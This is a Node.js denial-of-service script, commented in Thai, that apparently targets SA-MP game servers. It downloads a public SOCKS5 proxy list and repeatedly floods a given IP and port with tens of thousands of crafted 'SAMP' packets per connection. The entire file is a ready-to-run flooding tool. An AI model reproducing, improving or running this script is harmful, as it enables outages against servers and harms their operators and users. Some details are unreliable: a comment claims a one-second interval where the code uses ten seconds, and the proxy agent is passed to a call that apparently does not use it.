const axios = require('axios');
const { SocksProxyAgent } = require('socks-proxy-agent');
const net = require('net');

// ตั้งค่า IP และพอร์ตจากอาร์กิวเมนต์
const args = process.argv.slice(2);
if (args.length < 2) {
    console.log("Usage: node main.js <IP> <PORT>");
    process.exit(1);
}

const ip = args[0];
const port = args[1];
const orgip = ip;

// ข้อมูลแพ็กเก็ตในรูปแบบ Hexadecimal
const packets = [
    Buffer.from('53414d5090d91d4d611e700a465b00', 'hex'),
    Buffer.from('53414d509538e1a9611e63', 'hex'),
    Buffer.from('53414d509538e1a9611e69', 'hex'),
    Buffer.from('53414d509538e1a9611e72', 'hex'),
    Buffer.from('081e62da', 'hex'),
    Buffer.from('081e77da', 'hex'),
    Buffer.from('081e4dda', 'hex'),
    Buffer.from('021efd40', 'hex'),
    Buffer.from('021efd40', 'hex'),
    Buffer.from('081e7eda', 'hex')
];

console.log(`Ataque iniciado no ip: ${orgip} e Porta: ${port}`);

// ดาวน์โหลด proxy list
async function getProxies() {
    const response = await axios.get('https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt');
    return response.data.split('\n').filter(Boolean);
}

// ฟังก์ชันสำหรับส่งแพ็กเก็ตผ่าน proxy
async function sendPackets(proxy) {
    try {
        const agent = new SocksProxyAgent(`socks5://${proxy}`);
        const options = {
            host: ip,
            port: port,
            agent: agent
        };

        const socket = net.connect(options, () => {
            for (let i = 0; i < 90000; i++) {
                const msg = packets[Math.floor(Math.random() * packets.length)];
                socket.write(msg);

                if (port == 7777) {
                    socket.write(packets[5]);
                } else if (port == 7796) {
                    socket.write(packets[4]);
                } else if (port == 7771) {
                    socket.write(packets[6]);
                } else if (port == 7784) {
                    socket.write(packets[7]);
                } else if (port == 1111) {
                    socket.write(packets[9]);
                }
            }
            socket.end();
        });

        socket.on('error', (err) => {
            console.error(`Error with proxy ${proxy}: ${err.message}`);
        });

    } catch (error) {
        console.error(`Failed to connect through proxy ${proxy}: ${error.message}`);
    }
}

// ฟังก์ชันหลัก
async function startAttack() {
    const proxies = await getProxies();
    setInterval(() => {
        proxies.forEach(proxy => {
            sendPackets(proxy);
        });
    }, 10000); // ส่ง request ทุก 1 วินาที
}

// เริ่มการทำงาน
startAttack();
